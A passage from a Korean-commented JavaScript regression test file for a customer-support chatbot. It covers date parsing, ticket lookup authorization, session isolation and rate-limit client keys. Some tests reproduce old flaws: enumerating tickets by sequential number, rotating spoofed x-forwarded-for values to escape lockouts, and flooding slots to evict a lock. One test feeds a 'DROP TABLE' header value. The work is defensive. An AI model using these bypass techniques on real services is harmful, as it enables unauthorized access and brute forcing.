 * ① `RELATIVE_DAYS` 는 위에서부터 첫 번째로 걸리는 것을 쓰는데 「내일」이 「모레」보다 앞에
 *    있어, 「내일모레」가 **하루 당겨졌다**.
 * ② 분을 숫자로만 봐서 「2시 반」이 **2시 00분**이 됐다(30분 당겨진 약속이 접수된다).
 * ③ 「낼」이 부분 일치라 「보낼게요」의 꼬리가 **오늘**로 읽혔다.
 *
 * 세 값 모두 고객에게 그대로 되읽히고(「10월 20일, 몇 시가 좋을까요?」) 접수 요약에 적혀
 * 운영자에게 간다 — 고객은 자기가 말한 약속을 확인받았다고 믿은 채 다른 날에 기다린다.
 */
test('고객이 말한 때를 그대로 알아듣는다 (DS 45-3)', opts, async () => {
  const S = await slotsLib();

  // ── ① 「내일모레」 ──
  assert.deepEqual(S.parseDateTimeParts('내일모레 오후 2시', FIXED_NOW), { date: '2026-09-05', time: '14:00' });
  assert.equal(S.parseDateTime('내일모레', FIXED_NOW).value, '2026-09-05 (시간 미정)');
  // 나머지 상대 날짜는 종전 그대로다.
  assert.equal(S.parseDateTimeParts('모레', FIXED_NOW).date, '2026-09-05');
  assert.equal(S.parseDateTimeParts('내일', FIXED_NOW).date, '2026-09-04');
  assert.equal(S.parseDateTimeParts('오늘', FIXED_NOW).date, '2026-09-03');
  assert.equal(S.parseDateTimeParts('글피', FIXED_NOW).date, '2026-09-06');

  // ── ② 「반」도 분이다 ──
  assert.deepEqual(S.parseDateTimeParts('오후 2시 반', FIXED_NOW), { date: null, time: '14:30' });
  assert.equal(S.parseDateTimeParts('2시반', FIXED_NOW).time, '02:30');
  // 숫자 분·콜론 표기는 종전 그대로다.
  assert.equal(S.parseDateTimeParts('오후 2시 30분', FIXED_NOW).time, '14:30');
  assert.equal(S.parseDateTimeParts('14:30', FIXED_NOW).time, '14:30');
  assert.equal(S.parseDateTimeParts('오후 2시', FIXED_NOW).time, '14:00');

  // ── ③ 「보낼게요」의 꼬리를 날짜로 읽지 않는다 ──
  assert.deepEqual(S.parseDateTimeParts('자료 보낼게요', FIXED_NOW), { date: null, time: null });
  assert.equal(S.parseDateTimeParts('내일 보낼게요', FIXED_NOW).date, '2026-09-04', '「내일」까지 함께 잃으면 안 된다');
  assert.equal(S.parseDateTimeParts('낼 오후 2시', FIXED_NOW).date, '2026-09-04', '「낼」을 통째로 버리면 안 된다');

  // ── ④ 접수에 적히는 값이 함께 바뀐다(이 값이 운영자가 읽는 「희망 일시」다) ──
  const form = S.getForm('reservation');
  let st = S.startForm(form).state;
  st = S.applyInput(form, st, '홍길동', FIXED_NOW).state;
  const r = S.applyInput(form, st, '내일모레 오후 2시 반', FIXED_NOW);
  assert.equal(r.state.values.datetime, '2026-09-05 14:30', '접수에 적히는 값이 고객이 말한 때와 다르다');
});

/* ══════════ 49순위 — 백로그 소진 후 46차 재감사 (DS 49-1) ══════════ */

/**
 * DS 49-1 — 접수 상태 조회가 **접수번호만으로** 열렸다.
 *
 * 고객용 조회 창구(`GET /api/escalation?id=…`)는 인증이 없고 접수번호는 연번(`ESC-0001`)이다.
 * 종전에는 번호 하나로 `getTicket` 을 불러 상태·이관 사유·접수 시각·대기 인원을 돌려줬으니,
 * 밖에서 1번부터 훑으면 「접수가 몇 건 있고 · 언제 들어왔고 · 무엇 때문에 상담원으로
 * 넘어갔는가」가 그대로 읽혔다. 라우트는 돌려 볼 수 없는 자리라 가리는 자를 저장소에
 * **한 벌**로 두었다(`getTicketForSession`) — 여기서 그 자를 실제로 돌려 본다.
 */
test('남의 접수번호로는 접수를 볼 수 없다 (DS 49-1)', opts, async () => {
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);

  const mine = E.createTicket({ sessionId: 'rt-ds49-mine', tenant: null, reason: 'user_request', message: '사람 바꿔 주세요' }).ticket;

  // ① 종전 식 재현 — 번호만 알면 그대로 열린다(이것이 결함의 크기다).
  const peeked = E.getTicket(mine.id);
  assert.ok(peeked, '번호만으로는 이미 찾을 수 없다 — 이 재현이 깨지면 결함이 사라진 것이다');
  assert.equal(peeked.reasonCode, 'customer_request', '이관 사유까지 그대로 읽혔다');

  // ② 자기 세션으로는 그대로 볼 수 있다(쓸 수 있는 길을 막지 않는다).
  const own = E.getTicketForSession(mine.id, 'rt-ds49-mine');
  assert.ok(own, '자기 접수를 자기 세션으로도 볼 수 없다');
  assert.equal(own.id, mine.id);
  assert.equal(own.status, 'open');

  // ③ 남의 세션·빈 세션·없는 번호는 **모두 같은 답**이다 — 다르게 거절하면 그 차이가
  //    곧 「있다/없다」를 알려 주는 자가 된다(번호를 훑는 사람이 읽는 것이 그 차이다).
  assert.equal(E.getTicketForSession(mine.id, 'rt-ds49-other'), undefined, '남의 세션으로 열린다');
  assert.equal(E.getTicketForSession(mine.id, ''), undefined, '세션을 비워 보내면 열린다');
  assert.equal(E.getTicketForSession(mine.id, '  '), undefined, '공백만 보내면 열린다');
  assert.equal(E.getTicketForSession('ESC-9999', 'rt-ds49-mine'), undefined, '없는 번호에 다른 답을 돌려준다');
  // 앞뒤 공백은 같은 세션으로 본다(저장 쪽도 `trim` 한 값을 들고 있다).
  assert.ok(E.getTicketForSession(mine.id, ' rt-ds49-mine '), '같은 세션인데 공백 때문에 거절한다');

  // ④ 돌려주는 것은 **사본**이다 — 조회가 보관 중인 접수를 건드리지 못한다.
  own.status = 'resolved';
  assert.equal(E.getTicketForSession(mine.id, 'rt-ds49-mine').status, 'open', '조회로 받은 값을 고치면 원본이 바뀐다');

  // ⑤ 같은 번호가 다른 세션의 접수를 가리키는 일은 없다(접수는 세션당 하나를 재사용한다).
  const other = E.createTicket({ sessionId: 'rt-ds49-other', tenant: null, reason: 'user_request', message: '저도요' }).ticket;
  assert.notEqual(other.id, mine.id, '두 세션이 같은 접수를 쓴다 — 전제가 깨졌다');
  assert.equal(E.getTicketForSession(other.id, 'rt-ds49-mine'), undefined, '다른 세션의 접수가 열린다');
});

/* ══════════ 50순위 — 백로그 소진 후 47차 재감사 (DS 50-2·50-3) ══════════ */

/**
 * DS 50-3 — 재사용되는 접수의 「고객이 마지막으로 한 말」이 **첫 접수 때의 말**에서 멈췄다.
 *
 * 세션당 열린 접수는 재사용되므로 한 접수가 30분짜리 대화 전체를 덮을 수 있다. 종전에는
 * 재사용 경로가 `updatedAt`·연락처·요약·고객사만 갱신하고 본문은 손대지 않아, **요약은 최신
 * 대화인데 바로 위 칸 「고객이 마지막으로 한 말」은 가장 오래된 말**인 티켓이 됐다. 상담원이
 * 전화를 걸기 전에 읽는 칸은 이름이 「마지막」이라고 적힌 쪽이다(DS 20-3 이 이 칸이 비는 것을
 * 고친 그 자리 — 그때 본 것은 「비었다」이고 이번에 본 것은 「멈췄다」다).
 */
test('다시 접수하면 「마지막으로 한 말」이 따라온다 (DS 50-3)', opts, async () => {
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);

  const first = E.createTicket({
    sessionId: 'rt-ds50-reuse', tenant: null, reason: 'user_request',
    message: '배송이 3주째 안 와요', summary: '요약: 배송 지연',
  });
  assert.equal(first.created, true, '첫 접수가 만들어지지 않았다 — 전제가 깨졌다');

  const again = E.createTicket({
    sessionId: 'rt-ds50-reuse', tenant: null, reason: 'rule:agent',
    message: '아니 그냥 환불해 주세요', summary: '요약: 환불 요청',
  });
  // ① 같은 접수를 쓴다(번호가 늘지 않는다) — 이것이 이 결함이 서는 전제다.
  assert.equal(again.created, false, '세션당 접수 재사용이 깨졌다 — 이 결함의 전제가 사라졌다');
  assert.equal(again.ticket.id, first.ticket.id);
  // ② 요약은 종전에도 갱신됐다 — **그래서** 두 칸이 서로 다른 때를 가리켰다.
  assert.equal(again.ticket.summary, '요약: 환불 요청', '요약이 갱신되지 않는다 — 어긋남의 한쪽이 사라졌다');
  // ③ 이제 본문도 같은 때를 가리킨다.
  assert.equal(again.ticket.message, '아니 그냥 환불해 주세요', '「마지막으로 한 말」이 첫 접수 때의 말에서 멈춘다');
  assert.equal(E.getTicket(first.ticket.id).message, '아니 그냥 환불해 주세요', '보관 중인 접수에는 옛 말이 남아 있다');

  // ④ **빈 값으로는 덮지 않는다** — 되살린 대화에 고객 말이 없을 수 있다(그때는 적어 둔 말이 낫다).
  E.createTicket({ sessionId: 'rt-ds50-reuse', tenant: null, message: '   ' });
  assert.equal(E.getTicket(first.ticket.id).message, '아니 그냥 환불해 주세요', '빈 말로 적어 둔 말을 지운다');
  E.createTicket({ sessionId: 'rt-ds50-reuse', tenant: null });
  assert.equal(E.getTicket(first.ticket.id).message, '아니 그냥 환불해 주세요', '본문을 보내지 않은 요청이 적어 둔 말을 지운다');

  // ⑤ 가리는 관문을 **같은 함수 안에서** 지난다(DS 39-2) — 재사용 경로만 원문이 되면 안 된다.
  const masked = E.createTicket({ sessionId: 'rt-ds50-reuse', tenant: null, message: '제 번호 010-1234-5678 입니다' });
  assert.equal(masked.ticket.message.includes('010-1234-5678'), false, '재사용 경로가 마스킹을 건너뛴다');
  assert.match(masked.ticket.message, /010-\*+-5678/, '가린 모양이 저장 관문과 다르다');
  assert.deepEqual(masked.ticket.piiKinds, ['phone'], '가린 종류를 세지 않는다');
  // 가린 종류는 **지금 본문의 것**이다 — 번호가 없는 말로 바뀌면 함께 사라진다.
  const plain = E.createTicket({ sessionId: 'rt-ds50-reuse', tenant: null, message: '언제쯤 연락 오나요' });
  assert.equal(plain.ticket.piiKinds, undefined, '앞 본문의 가린 종류가 남아 있다');

  // ⑥ 상한도 같다 — 새로 만드는 쪽과 **같은 자리에서** 자른다(`TICKET_MESSAGE_LEN` = 300).
  const long = E.createTicket({ sessionId: 'rt-ds50-reuse', tenant: null, message: '가'.repeat(5000) });
  const fresh = E.createTicket({ sessionId: 'rt-ds50-reuse-2', tenant: null, message: '가'.repeat(5000) });
  assert.equal(fresh.created, true, '견줄 대상이 새 접수가 아니다');
  assert.ok(long.ticket.message.length < 5000, '재사용 경로에 길이 상한이 없다');
  assert.equal(long.ticket.message.length, fresh.ticket.message.length, '재사용 경로의 상한이 새 접수와 다르다');
});

/**
 * DS 50-2 — 운영자가 닫은 접수 뒤에 발급된 **새 번호를 같은 번호인 척** 말했다.
 *
 * 고객이 받아 적은 번호는 ESC-0002 인데, 그 접수가 완료된 뒤 연락처만 보내면 서버는 새 접수
 * ESC-0003 을 만들고 「접수번호 ESC-0003 **그대로** 상담원이 연락드릴게요」라고 답했다.
 * 접수번호는 고객이 전화로 읽어 주는 단 하나의 값이다 — 조용히 갈리면 상담원은 없는 번호를
 * 찾고, 고객은 자기 접수가 사라졌다고 듣는다. 엔진을 **실제로 돌려** 두 자리를 본다.
 */
test('앞 접수가 닫힌 뒤 바뀐 접수번호를 말한다 (DS 50-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const E = await eng('escalation');
  const S = await eng('session');
  // 조사는 **번호를 읽는 소리**에 맞는다 (DS 61-2) — 끝 숫자가 영·일·삼·육·칠·팔이면 받침이 있다.
  // (lib 의 `particle` 과 같은 판정이고, 그 쪽은 `tests/runtime.test.mjs` DS 61-1 이 돌려서 본다.)
  const eunNeun = (id) => ('013678'.includes(id.slice(-1)) ? '은' : '는');

  // ── ① 연락처만 보낸 경우(0-a2) — 종전에 「그대로」라고 적던 자리.
  const sid = 'rt-ds50-renum';
  const old = E.createTicket({ sessionId: sid, tenant: null, reason: 'user_request', message: '환불 문의' }).ticket;
  S.updateSession(sid, { ticketId: old.id, slots: { contact: 'first@example.com' }, handoffReason: 'customer_request' });
  // 운영자가 완료로 바꾼다 — 연락처는 그 자리에서 파기된다(방침 4조).
  assert.equal(E.updateTicket(old.id, { status: 'resolved' }).ok, true);

  const r = chat.replyTo('010-9876-5432', sid, null);
  assert.notEqual(r.ticketId, old.id, '닫힌 접수를 그대로 쓴다 — 이 결함의 전제가 사라졌다');
  assert.ok(r.reply.includes(`앞서 안내드린 접수번호 ${old.id}${eunNeun(old.id)} 더 진행되지 않아`), '앞 번호가 끝난 사실을 말하지 않는다');
  assert.ok(r.reply.includes(`새 접수번호는 ${r.ticketId}입니다`), '새 번호를 말하지 않는다');
  assert.equal(r.reply.includes('그대로'), false, '번호가 갈렸는데 「그대로」라고 말한다');

  // ── ② 번호가 **그대로일 때는** 종전 말 그대로다(멀쩡한 문장을 바꾸지 않는다).
  const sid2 = 'rt-ds50-same';
  const live = E.createTicket({ sessionId: sid2, tenant: null, reason: 'user_request', message: '환불 문의', contact: 'first@example.com' }).ticket;
  S.updateSession(sid2, { ticketId: live.id, slots: { contact: 'first@example.com' }, handoffReason: 'customer_request' });
  const r2 = chat.replyTo('010-9876-5432', sid2, null);
  assert.equal(r2.ticketId, live.id, '열려 있는 접수를 재사용하지 않는다');
  assert.ok(r2.reply.includes(`접수번호 ${live.id} 그대로`), '번호가 그대로인 경우의 말까지 바꿨다');
  assert.equal(r2.reply.includes('더 진행되지 않아'), false, '번호가 그대로인데 바뀌었다고 말한다');

  // ── ③ 연락처 수집 대기(0-a) — 번호가 바뀐 사실을 말하지 않던 자리.
  const sid3 = 'rt-ds50-await';
  const old3 = E.createTicket({ sessionId: sid3, tenant: null, reason: 'user_request', message: '상담원' }).ticket;
  S.updateSession(sid3, { ticketId: old3.id, awaitingContact: true, handoffReason: 'customer_request' });
  assert.equal(E.updateTicket(old3.id, { status: 'canceled' }).ok, true);
  const r3 = chat.replyTo('010-1111-2222', sid3, null);
  assert.notEqual(r3.ticketId, old3.id);
  assert.ok(r3.reply.includes(`앞서 안내드린 접수번호 ${old3.id}${eunNeun(old3.id)} 더 진행되지 않아`), '연락처 수집 자리가 바뀐 번호를 말하지 않는다');
  assert.ok(r3.reply.includes(`접수번호 ${r3.ticketId}`), '새 번호를 말하지 않는다');

  // ── ④ 앞서 알려 준 번호가 **없었으면** 아무 말도 보태지 않는다(첫 접수에 지난 번호는 없다).
  const r4 = chat.replyTo('상담원 연결해 주세요', 'rt-ds50-first', null);
  assert.ok(r4.ticketId, '첫 접수가 만들어지지 않았다');
  assert.equal(r4.reply.includes('더 진행되지 않아'), false, '알려 준 적 없는 번호가 끝났다고 말한다');
});

/* ══════════ 51순위 — 백로그 소진 후 48차 재감사 (DS 51-1·51-2·51-3) ══════════ */

/**
 * DS 51-1 — 횟수 제한·잠금이 **요청자가 적어 보낸 글자**로 사람을 갈랐다.
 *
 * 종전 식은 `x-forwarded-for` 의 **맨 앞**을 그대로 바구니 이름으로 썼다. 그 자리는 프록시가
 * 덮어쓰지 않는 한 요청을 보낸 사람이 적는 칸이다 — 한 줄만 바꿔 보내면 열쇠가 매 요청
 * 달라지고, 그 열쇠에 걸려 있던 것이 모두 함께 풀린다: 관리 토큰 무차별 대입 잠금(5회/10분)·
 * 고객용 접수 조회 제한(30회/분 — 49차가 접수번호 훑기를 막으려고 건 그 제한이다)·대화·접수·
 * 평가의 분당 제한 전부. 돌려 볼 수 있는 자리로 내리고(`lib/clientKey`) 여기서 실제로 센다.
 */
test('제한을 세는 열쇠를 요청자가 고를 수 없다 (DS 51-1)', opts, async () => {
  const C = await importLib('clientKey');
  const H = (o) => new Headers(o);

  /** 종전 식 — 맨 앞을 그대로 쓰고, 없으면 x-real-ip, 모양은 보지 않는다. */
  const before = (h) => {
    const fwd = h.get('x-forwarded-for');
    if (fwd) return fwd.split(',')[0].trim().slice(0, 64) || 'unknown';
    return h.get('x-real-ip')?.slice(0, 64) || 'unknown';
  };

  // ── ① 종전 식 재현 — 보내는 글자를 바꾸면 **매번 다른 바구니**가 된다.
  const rotated = ['rot-a', 'rot-b', 'rot-c', '198.51.100.7'].map((v) => H({ 'x-forwarded-for': v }));
  assert.equal(new Set(rotated.map(before)).size, 4, '종전 결함이 재현되지 않는다 — 이 검증은 아무것도 지키지 않는다');
  assert.equal(new Set(rotated.map(C.clientKey)).size, 2, '지금 식도 보내는 글자에 따라 갈린다');

  // ── ② 플랫폼이 적는 헤더를 먼저 본다 — 요청자가 보낸 값은 그 뒤로 밀린다.
  assert.equal(C.clientKey(H({ 'x-vercel-forwarded-for': '203.0.113.9', 'x-forwarded-for': '1.2.3.4' })), '203.0.113.9');
  assert.equal(C.clientKey(H({ 'x-real-ip': '203.0.113.9', 'x-forwarded-for': '1.2.3.4' })), '203.0.113.9');
  assert.equal(before(H({ 'x-real-ip': '203.0.113.9', 'x-forwarded-for': '1.2.3.4' })), '1.2.3.4', '종전 식은 보낸 값을 먼저 봤다');

  // ── ③ `x-forwarded-for` 는 **맨 뒤**를 쓴다(가장 가까운 프록시가 덧붙이는 자리다).
  assert.equal(C.clientKey(H({ 'x-forwarded-for': '1.2.3.4, 203.0.113.9' })), '203.0.113.9');
  assert.equal(C.clientKey(H({ 'x-forwarded-for': '203.0.113.9' })), '203.0.113.9', '한 칸뿐인 값을 버린다');

  // ── ④ 주소 모양이 아닌 글자는 열쇠로 쓰지 않는다 — 돌려 가며 보내도 **한 바구니**다.
  for (const bad of ['rot-a', 'not an ip', '999.1.1.1', '', '  ', 'DROP TABLE', '1.2.3']) {
    assert.equal(C.clientKey(H({ 'x-forwarded-for': bad })), C.UNKNOWN_CLIENT, `모양이 아닌 값(${bad})을 열쇠로 쓴다`);
  }
  assert.equal(C.clientKey(H({})), C.UNKNOWN_CLIENT, '아무 헤더도 없는 요청에 이름을 지어낸다');
  // 멀쩡한 요청자를 한 바구니로 몰지 않는다 — IPv6·IPv4 사상 주소도 주소다.
  assert.equal(C.clientKey(H({ 'x-real-ip': '2001:db8::1' })), '2001:db8::1');
  assert.equal(C.clientKey(H({ 'x-real-ip': '[2001:db8::1]' })), '[2001:db8::1]');
  assert.equal(C.looksLikeIp('::ffff:203.0.113.9'), true);
  assert.equal(C.looksLikeIp('255.255.255.255'), true);
  assert.equal(C.looksLikeIp('256.0.0.1'), false);

  // ── ⑤ 열쇠는 길이가 묶여 있다(아주 긴 글자로 바구니 목록을 밀어내지 못한다).
  assert.ok(C.clientKey(H({ 'x-real-ip': `203.0.113.9${'0'.repeat(200)}` })).length <= 64);
});

/**
 * DS 51-1(둘째 자리) — 잠금이 **자리 밀림으로 조용히 풀렸다.**
 *
 * 실패 기록은 2,000칸까지 들고, 종전에는 상한에 닿으면 삽입 순서 맨 앞(`keys().next()`)을
 * 그대로 지웠다 — 그 자리에 지금 잠겨 있는 키가 있으면 10분 잠금이 말없이 사라졌다.
 * 열쇠가 요청자의 손에 있던 것과 한 뿌리다: 열쇠를 바꿔 자리를 채우면 남의 잠금을 밀어낼 수 있었다.
 */
test('자리를 채워도 잠금이 밀려 나가지 않는다 (DS 51-1)', opts, async () => {
  const A = await importLib('adminAuth');
  A.resetLockouts();

  // ① 맨 앞에 잠긴 키를 하나 둔다 — 종전 식이 가장 먼저 지우던 그 자리다.
  const victim = 'victim-key';
  for (let i = 0; i < A.lockThreshold(); i += 1) A.recordAttempt(victim, false);
  assert.equal(A.lockoutStatus(victim).locked, true, '잠기지 않았다 — 전제가 깨졌다');

  // ② 열쇠를 바꿔 가며 자리를 가득 채운다(상한 2,000칸 + 여유).
  for (let i = 0; i < 2_100; i += 1) A.recordAttempt(`filler-${i}`, false);

  // ③ 잠금은 남아 있고, 밀려 나간 것은 **잠기지 않은 자리**다.
  assert.equal(A.lockoutStatus(victim).locked, true, '자리가 밀려 잠금이 풀렸다');
  assert.equal(A.lockoutStatus('filler-0').failures, 0, '자리가 전혀 밀려나지 않았다 — 전제가 깨졌다');
  // ④ 가득 찬 뒤의 실패도 계속 세어진다(지우지 않고 멈추면 그쪽이 새 구멍이 된다).
  assert.equal(A.recordAttempt('filler-new', false).failures, 1, '가득 찬 뒤의 실패를 세지 않는다');
  A.resetLockouts();
});

/**
 * DS 51-2 — 세션을 보내지 않은 손님을 **모두 같은 사람**으로 묶었다.
 *
 * 세션 식별자는 이 대화의 유일한 열쇠다(DS 49-3) — 서버는 이 글자 하나로 최근 12턴·수집한
 * 연락처·진행 중인 접수를 찾고, 접수 조회는 이 값으로 주인을 가린다(DS 49-1). 그런데 세션을
 * 보내지 않은 요청은 전부 `'anon'` 한 칸을 함께 썼고(카카오는 `kakao:kakao-anon`), 그 값은
 * **코드에 적혀 있는 글자**다. 관리 콘솔 「응답 테스트」가 바로 그 칸을 쓰고 있었다.
 */
test('세션을 보내지 않은 손님이 서로의 대화를 보지 않는다 (DS 51-2)', opts, async () => {
  const S = await importLib('session');
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);

  // ── ① 공용 값을 가린다(대소문자·공백을 다르게 적어도 같은 칸이다).
  for (const v of ['anon', ' anon ', 'ANON', '', '  ', 'kakao-anon', 'kakao:kakao-anon', 'kakao:', null, undefined, 7]) {
    assert.equal(S.isSharedSessionKey(v), true, `공용 세션 값(${String(v)})을 열쇠로 쓴다`);
  }
  for (const v of [S.newVisitorSessionId('web'), 'web_0123456789abcdef', 'console_abc', 'kakao:u-99']) {
    assert.equal(S.isSharedSessionKey(v), false, `멀쩡한 세션(${v})을 공용으로 본다`);
  }

  // ── ② 종전 식 재현 — 한 칸을 함께 쓰면 **뒤에 온 사람이 앞사람의 것을 본다.**
  S.resetSessions();
  S.updateSession('anon', { slots: { contact: '010-1234-5678' }, ticketId: 'ESC-0001', awaitingContact: true });
  const shared = S.getSession('anon');
  assert.equal(shared.slots.contact, '010-1234-5678', '종전 결함이 재현되지 않는다 — 이 검증은 아무것도 지키지 않는다');
  assert.equal(shared.ticketId, 'ESC-0001', '앞사람의 접수번호가 보이지 않는다 — 재현이 깨졌다');
  assert.equal(shared.awaitingContact, true, '연락처를 묻는 상태까지 공유되던 자리다');

  // ── ③ 창구가 발급하는 값은 서로를 보지 못한다(이어지지 않는 것이 사실이다).
  const a = S.newVisitorSessionId('web');
  const b = S.newVisitorSessionId('web');
  S.updateSession(a, { slots: { contact: '010-1111-2222' } });
  assert.equal(S.getSession(b).slots, undefined, '새 손님이 남의 연락처를 들고 시작한다');
  assert.equal(S.getSession(a).slots.contact, '010-1111-2222', '자기 값도 들고 있지 못한다');

  // ── ④ 발급값의 모양 — 서버 입력 상한(60자) 안이고, 돌려도 겹치지 않는다.
  const seen = new Set();
  for (let i = 0; i < 2_000; i += 1) {
    const v = S.newVisitorSessionId('web');
    assert.match(v, /^web_[0-9a-f]{32}$/, `발급값의 모양이 어긋난다(${v})`);
    assert.ok(v.length <= 60, '서버 입력 상한을 넘는다');
    seen.add(v);
  }
  assert.equal(seen.size, 2_000, '발급한 세션 식별자가 겹친다');
  assert.match(S.newVisitorSessionId('kakao'), /^kakao_[0-9a-f]{32}$/);

  // ── ⑤ 접수 주인 확인이 **알려진 글자 하나로 열리지 않는다.**
  const t = E.createTicket({ sessionId: 'anon', tenant: null, reason: 'rule:agent', message: '상담원 연결' }).ticket;
  assert.equal(t.sessionId, 'anon', '전제가 깨졌다 — 공용 주인으로 적힌 접수가 없다');
  assert.ok(E.getTicket(t.id), '번호만으로 찾을 수 없다 — 재현이 깨졌다');
  assert.equal(E.getTicketForSession(t.id, 'anon'), undefined, '공용 세션 값으로 남의 접수가 열린다');
  assert.equal(E.getTicketForSession(t.id, ' ANON '), undefined, '대소문자·공백을 바꾸면 열린다');
  const kko = E.createTicket({ sessionId: 'kakao:kakao-anon', tenant: null, reason: 'rule:agent', message: '상담원' }).ticket;
  assert.equal(E.getTicketForSession(kko.id, 'kakao:kakao-anon'), undefined, '카카오 공용 세션으로 열린다');
  // 멀쩡한 세션의 접수는 그대로 열린다 — 쓸 수 있는 길을 막지 않는다(DS 49-1).
  const mine = 'web_0123456789abcdef0123456789abcdef';
  const ok1 = E.createTicket({ sessionId: mine, tenant: null, reason: 'rule:agent', message: '상담원' }).ticket;
  assert.ok(E.getTicketForSession(ok1.id, mine), '자기 접수를 자기 세션으로도 볼 수 없다');

  // ── ⑥ 카카오 페이로드가 **모르는 사용자를 지어내지 않는다.**
  const K = await importLib('kakao', ['chat', 'webhookAuth']);
  assert.equal(K.parseKakaoPayload({ userRequest: { utterance: '안녕' } }).userId, '', '사용자 id 를 지어낸다');
  assert.equal(K.parseKakaoPayload({ userRequest: { utterance: '안녕', user: { id: ' u-7 ' } } }).userId, 'u-7');
  // 중복 전달 판정 키는 **페이로드의 값**으로 만든다 — 재전달에도 변하지 않아야 한다.
  const hdr = new Headers({ 'x-kakao-timestamp': '1700000000000' });
  assert.equal(K.kakaoEventKey(hdr, '', '안녕'), K.kakaoEventKey(hdr, '', '안녕'), '재전달이 다른 이벤트로 보인다');
});

/**
 * DS 51-3 — 카카오가 **끝난 접수를 현재형으로** 말하고, 연락처 없는 접수에 회신을 약속했다.
 *
 * 세션에 적힌 접수번호(`session.ticketId`)는 끝까지 남는다. 종전 어댑터는 그 번호 한 글자만
 * 받아 「이미 접수번호 ESC-0007로 접수돼 있어요. 다시 접수하지 않으셔도 상담원이 순서대로
 * 연락드릴게요」라고 적었고, 같은 판정으로 「상담원 연결」 버튼까지 감췄다 — 완료·취소 시
 * 연락처는 그 자리에서 파기되므로(방침 4조) 지킬 길이 이미 없는 약속이고, 그 접수 하나가
 * 상담원을 다시 부를 유일한 길을 막았다. 웹에서는 47차에 고친 자리다(DS 50-1·45-1).
 */
test('카카오가 끝난 접수를 현재형으로 말하지 않는다 (DS 51-3)', opts, async () => {
  const E = await importLib('escalation', ['handoff', 'storage', 'refusal']);
  const S = await importLib('session');
  const K = await importLib('kakao', ['chat', 'webhookAuth']);
  const engine = await importLib('chat', ['escalation', 'handoff', 'storage', 'refusal']);
  const base = { reply: '그 부분은 제가 정확히 답하기 어려워요.', intent: 'fallback', source: 'fallback', escalate: true, confidence: 0.1 };
  const texts = (res) => res.template.outputs.map((o) => o.simpleText.text).join('\n');
  const agentReply = (res) => (res.template.quickReplies ?? []).some((q) => q.label === '상담원 연결');
  const PROMISE = '다시 접수하지 않으셔도 상담원이 순서대로 연락드릴게요.';

  // ── ① 종전 식이 넘기던 값을 그대로 둬 본다 — 접수가 끝난 뒤에도 **번호는 그대로 남는다.**
  const sid = 'kakao:u-ds51';
  const t = E.createTicket({ sessionId: sid, tenant: null, reason: 'rule:agent', message: '상담원', contact: '010-1234-5678' }).ticket;
  S.updateSession(sid, { ticketId: t.id, channel: 'kakao' });
  assert.equal(E.updateTicket(t.id, { status: 'resolved' }).ok, true);
  const closedNow = E.getTicket(t.id);
  assert.equal(S.getSession(sid).ticketId, t.id, '종전 결함이 재현되지 않는다 — 세션이 끝난 번호를 놓았다');
  assert.equal(closedNow.status, 'resolved');
  assert.equal(closedNow.contact, undefined, '완료 시 연락처가 파기되지 않는다 — 전제가 깨졌다');
  assert.equal(E.isClosedStatus(closedNow.status), true);

  // ── ② 끝난 접수는 들고 있지 않는다 — 약속하지 않고, 상담원을 다시 부를 길을 내준다.
  const closed = K.toKakaoResponse(base, {
    filedTicket: { id: t.id, closed: E.isClosedStatus(closedNow.status), contactOnFile: Boolean(closedNow.contact) },
  });
  assert.equal(texts(closed).includes('이미 접수번호'), false, '끝난 접수를 현재형으로 말한다');
  assert.equal(texts(closed).includes('연락드릴게요'), false, '지킬 길 없는 약속을 한다');
  assert.equal(agentReply(closed), true, '끝난 접수가 상담원을 다시 부를 길을 막는다');

  // ── ③ 취소된 접수도 같다(상태 **코드**로 가른다 — 라벨은 바뀌는 말이다).
  const t2 = E.createTicket({ sessionId: 'kakao:u-ds51b', tenant: null, reason: 'rule:agent', message: '상담원' }).ticket;
  assert.equal(E.updateTicket(t2.id, { status: 'canceled' }).ok, true);
  const canceled = K.toKakaoResponse(base, { filedTicket: { id: t2.id, closed: true, contactOnFile: false } });
  assert.equal(texts(canceled).includes('이미 접수번호'), false);
  assert.equal(agentReply(canceled), true);
  assert.equal(E.isClosedStatus('open'), false, '진행 중인 접수를 끝났다고 본다');
  assert.equal(E.isClosedStatus('in_progress'), false, '상담 중인 접수를 끝났다고 본다');

  // ── ④ 진행 중이고 **연락처가 있는** 접수에는 종전 말 그대로다(멀쩡한 문장을 바꾸지 않는다).
  const open = K.toKakaoResponse(base, { filedTicket: { id: 'ESC-0009', closed: false, contactOnFile: true } });
  assert.ok(texts(open).includes('이미 접수번호 ESC-0009로 접수돼 있어요.'), '접수한 사실을 알리지 않는다');
  assert.ok(texts(open).includes(PROMISE), '회신 안내가 사라졌다');
  assert.equal(agentReply(open), false, '접수한 사람에게 접수를 다시 권한다');

  // ── ⑤ 진행 중이지만 **연락처가 없는** 접수에는 회신을 약속하지 않는다 (DS 45-1 과 같은 문장).
  const noContact = K.toKakaoResponse(base, { filedTicket: { id: 'ESC-0010', closed: false, contactOnFile: false } });
  // 「ESC-0010」은 「…영」으로 읽히므로 「으로」다 (DS 61-2) — 종전에는 이 줄이 「ESC-0010로」였다.
  assert.ok(texts(noContact).includes('이미 접수번호 ESC-0010으로 접수돼 있어요.'), '접수한 사실을 알리지 않는다');
  assert.equal(texts(noContact).includes(PROMISE), false, '연락처가 없는데 연락을 약속한다');
  assert.ok(texts(noContact).includes(engine.noContactLine().trim()), '엔진과 다른 말로 안내한다');
  assert.equal(agentReply(noContact), false, '접수한 사람에게 접수를 다시 권한다');

  // ── ⑥ 들고 있는 접수가 없으면 종전 그대로 상담원 연결을 권한다.
  assert.equal(agentReply(K.toKakaoResponse(base, { filedTicket: null })), true);
  assert.equal(agentReply(K.toKakaoResponse(base)), true);
});

/* ══════════ 52순위 — 백로그 소진 후 49차 재감사 (DS 52-1·52-2·52-3) ══════════ */

/**
 * DS 52-1 — 연락처를 **받아 적는 자**와 **가리는 자**가 서로 다른 모양을 보고 있었다.
 *
 * 36차(DS 39-3)가 「마스킹 규칙은 한 벌」을 세웠지만 그 한 벌은 `@/lib/pii` 안에서만 한 벌이었다.
 * 연락처를 받아 적는 쪽(`chat.extractContact`)은 자기 패턴을 따로 들고 있었고 거기에는 점이
